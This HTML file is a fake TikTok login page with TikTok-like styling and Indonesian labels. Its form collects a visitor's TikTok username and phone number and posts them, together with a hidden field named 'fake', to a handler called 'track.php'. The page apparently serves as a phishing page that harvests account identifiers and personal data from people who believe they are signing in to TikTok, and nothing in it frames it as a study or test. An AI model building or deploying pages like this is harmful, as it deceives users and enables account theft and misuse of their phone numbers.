<!DOCTYPE html>
<html>
<head>
    <title>TikTok Login</title>
    <link rel="stylesheet" href="assets/style.css">
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        form {
            background: #111;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px #ff2d55;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        input, button {
            padding: 10px;
            border: none;
            border-radius: 5px;
        }

        input {
            background: #222;
            color: #fff;
        }

        button {
            background-color: #ff2d55;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background-color: #e0244a;
        }
    </style>
</head>
<body>
    <form action="track.php" method="POST">
        <h2>Login TikTok</h2>
        <input type="text" name="tiktok_username" placeholder="Username TikTok" required>
        <input type="text" name="phone_number" placeholder="Nomor HP" required>
        <input type="hidden" name="fake" value="1">
        <button type="submit">Masuk</button>
    </form>
</body>
</html>
